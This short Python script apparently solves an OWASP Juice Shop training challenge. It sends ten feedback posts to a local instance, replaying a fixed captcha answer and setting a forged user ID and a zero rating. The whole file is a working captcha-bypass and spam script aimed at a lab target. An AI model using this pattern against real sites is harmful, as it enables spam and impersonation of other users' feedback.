import requests

myobj={"UserId":2,"captchaId":1,"captcha":"-20","comment":"site heheheheh (***@juice-sh.op)","rating":0}
url = "http://127.0.0.1:3000/api/Feedbacks/"

for i in range(10):
    x = requests.post(url, data = myobj)
    print(f"Sent {i} requests",end = "\r")
print("Sent 10 requests\nChallenge completed")

